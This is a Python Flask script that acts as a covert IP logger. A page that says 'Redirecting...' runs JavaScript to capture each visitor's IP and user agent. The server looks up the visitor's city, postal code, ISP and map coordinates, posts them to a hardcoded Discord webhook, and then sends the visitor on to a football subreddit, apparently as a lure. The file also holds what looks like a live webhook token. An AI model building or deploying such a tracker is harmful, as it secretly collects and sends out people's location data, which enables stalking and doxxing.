from flask import Flask, request, redirect, jsonify
import requests
from datetime import datetime

app = Flask(__name__)

# ===================== CONFIG =====================
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1430264733193207848/5fOooaQ3VYQePvd7m0ZR6hZsYPW0ML6pk9jZ5wMcin7JkyuHHVg_IQicnDqr18NWvsQh"
REDIRECT_URL = "https://www.reddit.com/r/footballhighlights/"

@app.route('/')
def index():
    # Serve a small JS snippet to capture real IP
    html = f"""
    <html>
    <head><title>Redirecting...</title></head>
    <body>
    <script>
    fetch('https://api.ipify.org?format=json')
        .then(resp => resp.json())
        .then(data => {{
            fetch('/log', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{ip: data.ip, ua: navigator.userAgent}})
            }});
            window.location.href = '{REDIRECT_URL}';
        }});
    </script>
    <p>Redirecting...</p>
    </body>
    </html>
    """
    return html

@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    ip = data.get("ip")
    user_agent = data.get("ua", "Unknown")

    # Query ipapi for accurate location
    try:
        resp = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
        info = resp.json()
    except:
        info = {}

    city = info.get("city", "Unknown")
    region = info.get("region", "Unknown")
    country = info.get("country_name", "Unknown")
    postal = info.get("postal", "Unknown")
    isp = info.get("org", "Unknown")
    lat = info.get("latitude", 0)
    lon = info.get("longitude", 0)
    google_maps_link = f"https://www.google.com/maps?q={lat},{lon}"
    now = datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S GMT")

    # Discord embed payload
    embed = {
        "username": "🌍 Visitor Logger",
        "embeds": [{
            "title": f"🚶 New Visitor from {city if city != 'Unknown' else 'Unknown'}",
            "color": 3066993,  # teal
            "fields": [
                {"name": "🖥️ IP Address", "value": f"`{ip}`", "inline": True},
                {"name": "📍 Location", "value": f"{city}, {region}, {country}", "inline": True},
                {"name": "📫 Postal", "value": postal, "inline": True},
                {"name": "🏢 ISP / Organization", "value": isp, "inline": True},
                {"name": "🌍 Google Maps", "value": f"[Open Map]({google_maps_link})", "inline": False},
                {"name": "📱 User Agent", "value": f"`{user_agent}`", "inline": False},
                {"name": "🕒 Time (GMT)", "value": now, "inline": True}
            ]
        }]
    }

    try:
        requests.post(DISCORD_WEBHOOK_URL, json=embed, timeout=5)
    except:
        pass

    return jsonify({"status": "ok"}), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
